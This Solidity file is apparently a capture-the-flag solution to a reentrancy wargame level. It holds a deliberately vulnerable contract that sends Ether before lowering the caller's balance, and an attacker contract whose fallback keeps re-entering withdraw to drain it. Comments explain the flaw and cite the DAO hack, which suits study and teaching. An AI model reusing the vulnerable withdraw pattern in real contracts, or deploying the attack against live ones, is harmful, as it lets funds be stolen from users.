// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Reentrancy
/// @author OpenZeppelin
/// @notice Steal all the funds from the contract
///         Use reentrancy guard when moving funds out of the contract
///         transfer and send are no longer reccomended
///         Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. 
///         Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic
///         Reentrancy is very common
///         The famous DAO hack used reentrancy to extract a large amount of money.
///         15 lines of code that could've prevented theDao hack
///         https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract AttackReentrant {
    Reentrance public reentrance;

    constructor(address _reentrant) payable {
      reentrance = Reentrance(payable(_reentrant));
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
      if (address(reentrance).balance > 0 ether) {
          reentrance.withdraw(0.001 ether);
      }
    }

    function attack(uint256 _value) external payable {
      require(msg.value >= 0.001 ether);
      reentrance.donate{value: 0.001 ether}(address(this));
      reentrance.withdraw(_value);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
      return address(this).balance;
    }
}